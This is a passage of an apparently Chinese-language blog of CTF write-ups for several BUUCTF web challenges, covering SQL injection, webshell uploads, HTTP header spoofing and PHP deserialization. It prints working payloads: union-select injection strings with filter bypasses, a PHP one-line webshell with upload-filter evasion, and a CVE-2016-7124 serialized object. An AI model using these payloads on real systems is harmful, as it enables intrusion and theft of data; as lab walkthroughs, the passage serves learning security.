style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;我就在这里&quot;;</span><br><span class="line">                $flag = &#x27;flag&#123;6c263e3e-5858-44f4-99ee-af3782ff7b38&#125;&#x27;;</span><br><span class="line">                $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="极客大挑战-2019-LoveSQL">[极客大挑战 2019]LoveSQL</h2><ul><li><p>打开靶机，这个界面还是很好看的，提示输入账号及密码。在账户一栏加上转义字符 <kbd>\</kbd> 做个简单测试，发现数据以 GET 方式发出，且存在字符型注入漏洞，注入点的闭合符号为单引号 <kbd>&#39;</kbd>。</p><img src="0025.webp" alt="" style="zoom:75%"></li><li><p>可以构造万能密码 <kbd>1&#39; or 1=1#</kbd>，密码随便输入，发现登录成功，显示了管理员的账户与密码，可惜并没有用，因为账号密码再登录之后依然是这个界面，这样拿不到 <kbd>flag</kbd> 的啊！</p><img src="0026.webp" alt="" style="zoom:75%"></li><li><p>所以还是要从注入点慢慢抠数据出来，首先使用 <kbd>&#39; order by 1#</kbd> 语句判断查询列数（实测本题对 <kbd>--</kbd> 注释符作了过滤），当然在 URL 中需使用 <kbd>#</kbd> 的编码形式 <kbd>&#37;23</kbd>，<kbd>payload</kbd> 如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; order by 3%23&amp;password=1</span><br></pre></td></tr></table></figure><p>此处并未使用正确账号密码因此小于等于列数时会提示账户密码错误，而大于列数时则提示语法错误，如图可知查询列数为三列。</p><img src="0027.webp" alt="" style="zoom:75%"></li><li><p>接下来判断回显位，<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,2,3%23&amp;password=1</span><br></pre></td></tr></table></figure><p>浏览器在账号处回显了数字 <kbd>2</kbd>，在密码处回显了数字 <kbd>3</kbd>，因此之后查询的数据放后两位即可。</p><img src="0028.webp" alt="" style="zoom:75%"></li><li><p>首先查询当前数据库名，使用 <kbd>database()</kbd> 函数即可，<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,database(),3%23&amp;password=1</span><br></pre></td></tr></table></figure><p>得到当前数据库名称为：<kbd>geek</kbd>。</p><img src="0029.webp" alt="" style="zoom:75%"></li><li><p>然后就是爆表名，借助老朋友 <kbd>information_schema</kbd> 库中的数据，<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,group_concat(table_name separator &quot; - &quot;),3 from information_schema.tables where table_schema=&quot;geek&quot;%23&amp;password=1</span><br></pre></td></tr></table></figure><p>为方便查看，这里使用 <kbd>group_concat()</kbd> 函数将所查询的各行数据整合并指定分隔符，查询结果如下图，可知当前数据库中有 <kbd>geekuser</kbd> 与 <kbd>l0ve1ysq1</kbd> 两张表。</p><img src="0030.webp" alt="" style="zoom:75%"></li><li><p>接下来就是查表中的字段名了，<kbd>flag</kbd> 大概率被放在 <kbd>l0ve1ysq1</kbd> 表中，因此直接查他。<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,group_concat(column_name separator &quot; - &quot;),3 from information_schema.columns where table_name=&quot;l0ve1ysq1&quot;%23&amp;password=1</span><br></pre></td></tr></table></figure><p>查询结果如下图，该表中共有 <kbd>id</kbd>、<kbd>username</kbd>、<kbd>password</kbd> 三个字段。</p><img src="0031.webp" alt="" style="zoom:75%"></li><li><p>最后一步，开始爆数据直接对 <kbd>l0ve1ysq1</kbd> 表查即可，<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,group_concat(concat_ws(&quot; - &quot;,id,username,password) separator &quot;&lt;br&gt;&quot;),3 from l0ve1ysq1%23&amp;password=1</span><br></pre></td></tr></table></figure><p>为便于观察，这里添加 <kbd>concat_ws()</kbd> 函数将同一行数据整合，并指定分隔符。查询结果如图，末尾即为爆出来的 <kbd>flag</kbd>。</p><img src="0032.webp" alt="" style="zoom:75%"></li></ul><h2 id="极客大挑战-2019-Knife">[极客大挑战 2019]Knife</h2><ul><li><p>打开靶机，提示菜刀，并且列出了经典一句话木马的关键部分 <kbd>eval($_POST[Syc]);</kbd>，也就是说该木马的连接密码为 <kbd>Syc</kbd>。</p><img src="0033.webp" alt="" style="zoom:75%"></li><li><p>尝试性的在蚁剑连接一下，直接连接成功了。嗯，所以直接去根目录寻找 <kbd>flad</kbd> 即可。</p><img src="0034.webp" alt="" style="zoom:75%"></li><li><p>不过，看到 <a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/121023808">一位师傅的解法</a> 很有意思，尽量回避对工具的依靠。一句话木马的本质就是利用 <kbd>eval()</kbd> 函数将 POST 方法传入的参数作为代码执行，那直接向 <kbd>Syc</kbd> 变量传递我们需要的指令，那就不需要工具就能拿到 <kbd>flag</kbd> 了。这里使用 <kbd>scandir()</kbd> 函数对根目录进行扫描，使用 <kbd>file_get_contents()</kbd> 函数获取指定文件内容，并使用 <kbd>var_dump()</kbd> 输出前述两个函数返回的结果。因此只需通过 POST 方法分别传入以下 <kbd>payload</kbd> 即可在调试界面获得 <kbd>flag</kbd>，<psw>之所以要在调试界面查看是因为字体默认为黑色，而本站背景就是黑色，因此看不出来</psw>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Syc=var_dump(scandir(&#x27;/&#x27;));</span><br><span class="line">// 列出根目录，发现 flag</span><br><span class="line">Syc=var_dump(file_get_contents(&#x27;/flag&#x27;));</span><br><span class="line">// 打开 flag 文件</span><br></pre></td></tr></table></figure></li></ul><h2 id="极客大挑战-2019-Http">[极客大挑战 2019]Http</h2><ul><li><p>打开靶机，是三叶草的介绍网页，还得是三叶草啊。</p><img src="0035.webp" alt="" style="zoom:75%"><p>网页是挺好看，就是找半天看不到任何提示，也没个明确下手点，最后在源码的一个角落找到了跳转至其他文件的链接，属实有点为难眼瞎的小白了。</p><img src="0036.webp" alt="" style="zoom:75%"></li><li><p>直接访问找到的这个文件，页面提示不是从 <kbd>https&#58;//Sycsecret.buuoj.cn</kbd> 跳转过来的，也就是说如果是从这个地址过来应该就能看到不一样的界面。</p><img src="0037.webp" alt="" style="zoom:75%"></li><li><p>修改来源好办啊，抓包后将网页的请求头的 <kbd>Referer</kbd> 字段修改为指定地址就好了，由于我们不是跳转的，所以这个字段需要自己添加。<kbd>Burp</kbd> 改好发包之后，网页返回如下，提示使用 <kbd>Syclover</kbd> 浏览器。</p><img src="0038.webp" alt="" style="zoom:75%"></li><li><p>浏览器也好办，将请求头的 <kbd>User-Agent</kbd> 字段修改为 <kbd>Syclover</kbd> 即可，问题不大，再改一遍提交就是了，结果又来事儿了，显示只能通过本地访问。<psw>一次性说完吧求求了。</psw></p><img src="0039.webp" alt="" style="zoom:75%"></li><li><p>这倒也好解决，继续修改请求头，添加 <kbd>x-forwarded-for</kbd> 字段并赋值为本地即可，该字段存放发起请求的真实 <kbd>ip</kbd>，主要用于代理、负载均衡等环境。所以改为本地就等于我们是从本地访问的，完美，再一次发包。终于这次不再啰嗦，直接交出了 <kbd>flag</kbd>。</p><img src="0040.webp" alt="" style="zoom:75%"><p>完整的伪造后请求头如下，奇怪的是，<kbd>X-Forwarded-For</kbd> 字段置于尾部会造成 <kbd>400</kbd> 错误。应该是被认出来是假的了吧。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Secret.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:26361</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Syclover</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://Sycsecret.buuoj.cn</span><br></pre></td></tr></table></figure></li></ul><h2 id="极客大挑战-2019-Upload">[极客大挑战 2019]Upload</h2><ul><li><p>打开靶机，提示上传图片，因此应该是一个文件上传漏洞。那先老老实实上传一个图片，发现竟然上传失败，正规图片也过滤？</p><img src="0041.webp" alt="" style="zoom:75%"><p>换用一个小点的图片便上传成功了，因此靶机对文件大小存在限制，当然这不影响解题，毕竟用的都是一句话木马。</p></li><li><p>上传含有一句话木马的 PHP 文件，浏览器回显 <kbd>Not image</kbd>，区区小文件依然无法上传，显然靶机对文件进行了过滤。禁用 <kbd>js</kbd> 后依旧失败，因此为后端过滤。</p></li><li><kbd>Burp</kbd> 抓包后修改 <kbd>MIME</kbd> 类型为 <kbd>image/jpeg</kbd>，发送后提示禁止 <kbd>php</kbd> 文件，因此靶机后端存在对后缀名的过滤。 <img src="0042.webp" alt="" style="zoom:75%"><p>值得注意的是文件头处的 <kbd>Content-Type</kbd> 字段值表示传送二进制文件，<kbd>boundary</kbd> 则是包裹数据的随机序列，这并不是该被修改的地方。</p></li><li><p>将后缀名更改为 <kbd>PhP</kbd> 尝试大小写绕过无效，于是继续尝试 <kbd>php3</kbd>、<kbd>php5</kbd>、<kbd>pht</kbd>、<kbd>phtml</kbd>等后缀别名，仅有 <kbd>phtml</kbd> 绕过成功，不过这次提示过滤了字符 <kbd>&#60;?</kbd>，也就是正常的 PHP 代码都被过滤了。</p><img src="0043.webp" alt="" style="zoom:75%"></li><li><p>不过一句话木马形式多样，换一个就行了，可以将代码置于 <kbd>script</kbd> 标签中，并设置语言属性为 <kbd>php</kbd> 即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;h-t-m&#x27;])&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>将上述木马文件再次上传，通过了 <kbd>&#60;?</kbd> 字符过滤，迎来了新的问题：</p><img src="0044.webp" alt="" style="zoom:75%"></li><li><p>他识别出来并非图片文件，因此程序很可能还对文件头进行了检验，而 <kbd>jpg</kbd> 图片文件头三字节的字节码为 <kbd>FFD8FF</kbd>，因此如图所示在文件开头预留位置抓包修改字节码即可：</p><img src="0045.webp" alt="" style="zoom:75%"><p>发包之后浏览器也返回了好消息，上传成功！</p><img src="0046.webp" alt="" style="zoom:75%"></li><li><p>可惜并没有提供文件所上传的位置，因此怕是只能猜，一般都会放在 <kbd>upload</kbd> 目录下，所幸本题就是如此。然后直接使用蚁剑连接即可，<kbd>flag</kbd> 就在根目录。</p><img src="0047.webp" alt="" style="zoom:75%"></li></ul><h2 id="ACTF2020-新生赛-Upload">[ACTF2020 新生赛]Upload</h2><ul><li><p>打开靶机，一个灯泡，靠近就会发现文件上传点。</p><img src="0048.webp" alt="" style="zoom:75%"></li><li><p>那就不客气了直接上传 <kbd>php</kbd> 一句话木马，弹出了提示窗口，显然前端验证了后缀名。</p><img src="0049.webp" alt="" style="zoom:75%"></li><li><p>前端好办，直接把 <kbd>js</kbd> 禁用就行了，再次上传，浏览器没有任何反应？调试发现回显在左上角，提示文件被禁止，因此后端还有过滤。</p><img src="0050.webp" alt="" style="zoom:75%"></li><li><p>又到了猜后端过滤方式的时候了，方便起见，还是从后缀名下手。经过尝试，直接大小写即可绕过，且程序会对文件进行重命名，目录也比较特别，要是没有回显怕是不太好解：</p><img src="0051.webp" alt="" style="zoom:75%"><p>既然目录及文件名都给出了，直接蚁剑连接即可。</p></li><li><p>此外，网上的 <kbd>WP</kbd> 大多使用 <kbd>php</kbd> 别名绕过，实测 <kbd>php3</kbd>、<kbd>php4</kbd>、<kbd>php5</kbd>、<kbd>pht</kbd> 后缀名均无效，不过 <kbd>phtml</kbd>、<kbd>phps</kbd> 依然有效。</p></li></ul><h2 id="极客大挑战-2019-BabySQL">[极客大挑战 2019]BabySQL</h2><ul><li><p>打开靶机，经典极客大挑战的界面，在账户密码处输入测试字符，含有单引号，结果浏览器回显了报错。这就好办了，有报错信息就可以调试，同时确定存在注入点且为单引号闭合的字符型注入，此外数据通过 GOT 方法传送。</p><img src="0052.webp" alt="" style="zoom:75%"></li><li><p>于是直接测试万能密码 <kbd>1&#39; or 1=1#</kbd>，结果依然报错。</p><img src="0053.webp" alt="" style="zoom:75%"><p>这个报错是十分异常的，造成这个问题基本是 <kbd>1=1</kbd> 前文出现了问题，应该是 <kbd>or</kbd> 被过滤掉了，使用 <kbd>||</kbd> 符号替代 <kbd>or</kbd> 发现登录成功，确定注入点存在关键词过滤。</p><img src="0054.webp" alt="" style="zoom:75%"></li><li><p>简单测试一下后台的过滤逻辑，在单引号前放置关键词 <kbd>select</kbd> 查看报错，发现 <kbd>select</kbd> 被过滤，而且是直接删除，尝试双写绕过，成功！</p><img src="0055.webp" alt="" style="zoom:75%"><p>此外，经过测试 <kbd>or</kbd>、<kbd>select</kbd>、<kbd>union</kbd>、<kbd>and</kbd>、<kbd>order</kbd>、<kbd>by</kbd>、<kbd>from</kbd> 等关键字均被过滤，其中 <kbd>order</kbd> 是过滤 <kbd>or</kbd> 附赠的，当然全都可以通过双写绕过。</p></li><li><p>接下来就可以安心注入了，首先判断查询列数，构造 <kbd>payload</kbd> 如下，确定查询列数为三列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27; oorr 1=1 oorrder bbyy 4--+</span><br></pre></td></tr></table></figure><p>然后确定回显位，构造 <kbd>payload</kbd> 如下，确定二、三位回显，分别对应用户名与密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27; ununionion seselectlect 1,2,3--+</span><br></pre></td></tr></table></figure><p>然后顺手查个数据库名，构造 <kbd>payload</kbd> 如下，得到数据库名 <kbd>geek</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27; ununionion seselectlect 1,2,database()--+</span><br></pre></td></tr></table></figure><p>然后就是查表，虽然双写绕过挺有意思的，但是 <kbd>or</kbd> 的出现频率有点高了，连 <kbd>information</kbd> 和笔者用于美观使用的 <kbd>separator</kbd> 都需要绕一下，构造 <kbd>payload</kbd> 如下，获得两张表 <kbd>b4bsql</kbd> 和 <kbd>geekuser</kbd>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27; ununionion seselectlect 1,2,group_concat(table_name separatoorr &quot; - &quot;) frfromom infoorrmation_schema.tables whwhereere table_schema=&quot;geek&quot;--+</span><br></pre></td></tr></table></figure><p>然后就是查表 <kbd>b4bsql</kbd> 中字段，构造 <kbd>payload</kbd> 如下，获取三个表名 <kbd>id</kbd>、<kbd>username</kbd>、<kbd>password</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27; ununionion seselectlect 1,2,group_concat(column_name separatoorr &quot; - &quot;) frfromom infoorrmation_schema.columns whwhereere table_name=&quot;b4bsql&quot;--+</span><br></pre></td></tr></table></figure><p>最后就是查询数据，注意这次 <kbd>password</kbd> 也需要绕过一下，构造 <kbd>payload</kbd> 如下，最后一行即 <kbd>flag</kbd>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27; ununionion seselectlect 1,2,group_concat(concat_ws(&quot; - &quot;,id,username,passwoorrd) separatoorr &quot;&lt;br&gt;&quot;) frfromom b4bsql--+</span><br></pre></td></tr></table></figure></li><li><p>本题与 [[极客大挑战 2019]LoveSQL](#[极客大挑战 2019]LoveSQL) 基本一致，故 <kbd>payload</kbd> 基本直接取自那题，本关只需注意绕过即可。当然这两关都可以直接查询 <kbd>ctf</kbd> 库中的 <kbd>Flag</kbd> 表中 <kbd>flag</kbd> 字段的数据，直接就是 <kbd>flag</kbd>，各名称来源与前文同理，最终查询 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27; ununionion seselectlect 1,2,flag frfromom ctf.Flag--+</span><br></pre></td></tr></table></figure></li></ul><h2 id="极客大挑战-2019-PHP">[极客大挑战 2019]PHP</h2><ul><li><p>打开靶机，一个非常不错的交互界面，提示网站存在备份文件，除此之外貌似没有任何有效信息。</p><img src="0056.webp" alt="" style="zoom:75%"></li><li><p>既然如此就只能扫描一下网站目录中的备份文件了，这里使用 <kbd>dirsearch</kbd> 工具进行扫描。由于 BUU 平台的访问频率限制，直接扫描就会返回 <kbd>429</kbd> 状态码，所以可能需要添加延时，输入命令如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirsearch.py -u [靶机地址] --delay=5</span><br></pre></td></tr></table></figure><p>稍等好一会儿即可看到结果：目录中存在 <kbd>www.zip</kbd> 文件。</p><img src="0057.webp" alt="" style="zoom:75%"><p>实测其实直接扫也有一定几率能扫出来，毕竟被限制一小段时间后又有一小段时间可以正常访问，所以只要正好 <kbd>ww.zip</kbd> 出现时适逢窗口期即可。不过还是不建议这么干，请友善对待此类供所有人免费使用的设备。</p></li><li><p>知道备份文件后直接访问并下载下来即可，压缩包中有如下文件：</p><img src="0058.webp" alt="" style="zoom:75%"><p>有个让人在意的 <kbd>flag.php</kbd> 文件，莫非里面就是 <kbd>flag</kbd>，然而事实上其内容如下，被耍了就是说。不过，靶机中的该文件上应该就存有真正的 <kbd>flag</kbd>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>所以还是老老实实审计一下代码，除去两个前端文件还有两个文件，先从 <kbd>index.php</kbd> 入手，该文件主要代码如下，程序包含了 <kbd>class.php</kbd> 文件，然后通过 GET 方式接收了变量 <kbd>select</kbd> 并将其反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么再看看 <kbd>class.php</kbd> 文件，这边就是大段的 PHP 代码了。代码主体定义了一个 <kbd>Name</kbd> 类，类中含有两个私有变量 <kbd>username</kbd> 和 <kbd>password</kbd>，也就是用户名和密码。其构造函数 <kbd>&#95;&#95;construct()</kbd> 会接收参数并赋值给私有变量，而对象被反序列化前自动执行的 <kbd>&#95;&#95;wakeup()</kbd> 函数则会将私有变量 <kbd>username</kbd> 赋值为 <kbd>guest</kbd>。值得注意的是该类的析构函数 <kbd>&#95;&#95;destruct()</kbd> 会对密码进行检验，若值不等于 <kbd>100</kbd> 便会输出提示信息并终止程序，否则继续判断用户名是否为 <kbd>admin</kbd>，而用户名等于时便会输出 <kbd>flag</kbd>，不然则还是输出提示信息。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因此，我们只需构造并传递一个 <kbd>Name</kbd> 类的对象，并且将其私有变量 <kbd>username</kbd> 与 <kbd>password</kbd> 分别赋值为 <kbd>admin</kbd> 与 <kbd>100</kbd> 即可。但是存在的问题是，传递对象时必然将其序列化，再经过程序反序列化才可完成，而反序列化之前则会自动调用 <kbd>&#95;&#95;wakeup()</kbd> 函数，该函数又会将 <kbd>username</kbd> 赋值为 <kbd>guest</kbd>。因此，要想传递指定对象获取 <kbd>flag</kbd>，就得绕过 <kbd>&#95;&#95;wakeup()</kbd> 函数。</p></li><li><p>先考虑序列化对象的问题，其实可以直接在本地构造并使用 <kbd>serialize()</kbd> 函数进行序列化的问题，不过此类较为简单的序列化还是可以用手的。指定序列化字符串如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure><p>其中 <kbd>O</kbd> 代表<strong>类</strong>，<kbd>4</kbd> 为其后类名 <kbd>Name</kbd> 的长度，而类名之后的数字 <kbd>2</kbd> 则是对象中的属性个数，这里代表两个变量，在此之后则是花括号包裹的属性信息。不同字段的信息使用分号分隔，花括号内按照 <code>属性1名;属性1值;属性2名;属性2值;...</code> 的顺序排列，其中 <kbd>s</kbd> 表示字符串，<kbd>i</kbd> 表示整形，类型后接的就是数据长度了。值得注意的是，由于变量都是私有的，因此变量名前需要带上用空字符包裹的类名，而空字符进行 URL 编码即 <kbd>&#37;00</kbd>。</p></li><li><p>得到序列化对象后就要考虑绕过 <kbd>&#95;&#95;wakeup()</kbd> 函数的事情了，这里利用的是 PHP 中的漏洞 <kbd>CVE-2016-7124</kbd>，如果序列化字符串中表示对象属性个数的值<strong>大于</strong>真实的属性个数时会跳过 <kbd>&#95;&#95;wakeup()</kbd> 函数的执行，因此只需将上述序列化字符串中属性个数修改为更大的值即可绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure></li><li><p>最后将上述序列化字符串通过 GET 方式传给 <kbd>select</kbd> 即可获得 <kbd>flag</kbd>。</p><img src="0059.webp" alt="" style="zoom:75%"></li></ul><h2 id="ACTF2020-新生赛-BackupFile">[ACTF2020 新生赛]BackupFile</h2><ul><li><p>打开靶机，仅有一句 <kbd>Try to find out source file!</kbd>，除此之外没有任何其他内容，包括源码。不过，标题提示备份文件，所以后台应该存在备份文件。</p><img src="0060.webp" alt="" style="zoom:75%"></li><li><p>那么依然扫描一下网站目录，方法与上一题一致，使用如下命令调用 <kbd>dirsearch</kbd> 工具扫描即可。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirsearch.py -u [靶机地址] --delay=5</span><br></pre></td></tr></table></figure><p>不得不说工具就是强，扫出这么些东西，其中 <kbd>inedx.php.bak</kbd> 便是所需的备份文件。</p><img src="0061.webp" alt="" style="zoom:75%"></li><li><p>下载文件后直接去掉后缀 <kbd>.bak</kbd> 即为正规 PHP 文件，文件中包含如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 